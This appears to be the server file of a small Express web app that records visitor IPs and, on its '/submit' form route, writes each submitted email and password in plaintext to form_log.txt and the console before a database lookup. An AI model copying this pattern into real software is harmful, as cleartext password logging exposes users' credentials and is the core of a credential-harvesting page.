import express from 'express';
import path from 'path'
import { dirname } from 'path';
import { fileURLToPath } from 'url';
import bodyParser from 'body-parser';
import fs from 'fs'

import {getUser} from './database.js';

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
app.use(bodyParser.urlencoded({ extended: true }));

app.use(express.static("public"))
app.get('/', async (req,res) => {
    let time = new Date()
    
    let ip = req.ip;
    let protocol = req.protocol
    let method = req.method
    let data = `${time}, ${ip}, ${protocol}, ${method} \n`;
    fs.appendFile('output.txt',data, (err) => {if (err) throw err})
    res.sendFile(path.join(__dirname, "public", 'views', "index.html"))
    // res.send(path.join("hello"))
})

app.post('/submit', async (req,res) => {
    console.log(req.body);

    let time = new Date()
    let ip = req.ip;
    let protocol = req.protocol
    let method = req.method
    let email_field = req.body.email;
    let password_field = req.body.password
    let data = `${time}, ${ip}, ${protocol}, ${method}, ${email_field}, ${password_field}, \n`;
    fs.appendFile('form_log.txt',data, (err) => {if (err) throw err})

    const user = await getUser(req.body);
    res.send(user)
})


 
app.listen(3000)